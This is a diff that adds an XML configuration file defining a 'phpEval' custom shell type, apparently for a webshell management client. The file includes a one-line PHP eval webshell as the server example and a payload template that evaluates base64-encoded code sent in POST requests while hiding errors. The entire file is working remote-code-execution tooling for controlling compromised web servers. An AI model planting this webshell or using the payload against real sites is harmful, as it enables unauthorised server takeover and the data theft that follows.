@@ -1,0 +1,18 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<customShellType>
+  <basicSetting>
+    <name>phpEval</name>
+    <serviceExample><![CDATA[<?php @eval($_POST[a])?>]]></serviceExample>
+	<mainCodeParam location="Body" encrymode="None" >passwd</mainCodeParam>
+  </basicSetting>
+  <mainCodeSetting>
+	<funcCodeParam location="Body" encrymode="Base64" >funcCode</funcCodeParam>
+	<item><![CDATA[@ini_set("display_errors","0");
+@set_time_limit(0);
+@set_magic_quotes_runtime(0);
+print("->|");
+eval(base64_decode($_POST[$funcCode$]));
+print("|<-");
+die();]]></item>
+  </mainCodeSetting>
+</customShellType>
